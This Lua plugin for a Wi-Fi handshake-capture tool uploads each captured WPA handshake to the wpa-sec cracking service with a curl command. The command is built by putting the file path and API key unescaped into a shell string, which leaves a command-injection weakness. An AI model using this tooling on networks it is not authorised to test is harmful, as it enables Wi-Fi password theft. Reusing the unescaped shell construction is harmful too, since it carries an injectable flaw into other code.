-- wpa_sec plugin: uploads captured handshakes to wpa-sec.stanev.org for
-- hash-cracking-as-a-service.
-- Hooks: on_ready, on_handshake. Available globals on_handshake:
-- `handshake_bssid`, `handshake_ssid`, `handshake_path`.

local CONFIG_PATH = "/etc/pwnghost/config.toml"

local initialized = false
local api_key = nil
local api_url = "https://wpa-sec.stanev.org/"

local function read_config_value(section, key)
  local f = io.open(CONFIG_PATH, "r")
  if not f then
    return nil
  end
  local content = f:read("*a")
  f:close()

  local section_start = content:find("%[" .. section:gsub("%.", "%%.") .. "%]")
  if not section_start then
    return nil
  end

  local body_start = content:find("\n", section_start) or section_start
  local next_section = content:find("\n%[", body_start)
  local body = content:sub(body_start, next_section or #content)

  return body:match(key .. '%s*=%s*"([^"]*)"') or body:match(key .. "%s*=%s*([%d%.]+)")
end

local function init()
  if initialized then
    return
  end
  initialized = true

  api_key = read_config_value("plugins.wpa_sec", "api_key")
  api_url = read_config_value("plugins.wpa_sec", "api_url") or api_url

  if not api_key or api_key == "" then
    io.stderr:write("[wpa_sec] no api_key configured under [plugins.wpa_sec]; handshake uploads disabled\n")
  else
    io.stderr:write("[wpa_sec] ready, will upload handshakes to " .. api_url .. "\n")
  end
end

function on_ready()
  init()
  return true
end

function on_handshake()
  init()

  if not api_key or api_key == "" then
    return true
  end

  -- The real wpa-sec service expects a raw pcap capture and runs its own
  -- extraction server-side; this build only retains the already-converted
  -- hashcat `.hc22000` file (`handshake_path`), so that's what gets
  -- uploaded. If wpa-sec can't parse hashcat-format input directly it will
  -- reject it -- logged below, non-fatal either way.
  local cmd = string.format(
    "curl -s -m 30 -o /dev/null -w '%%{http_code}' --cookie 'key=%s' -F 'file=@%s' '%s' 2>/dev/null",
    api_key, handshake_path, api_url)

  local handle = io.popen(cmd)
  local http_code = handle and handle:read("*a")
  if handle then
    handle:close()
  end

  if http_code == "200" then
    io.stderr:write(string.format("[wpa_sec] uploaded handshake for %s (%s)\n",
      tostring(handshake_ssid), tostring(handshake_bssid)))
  else
    io.stderr:write(string.format("[wpa_sec] upload failed for %s (http=%s)\n",
      tostring(handshake_path), tostring(http_code)))
  end

  return true
end
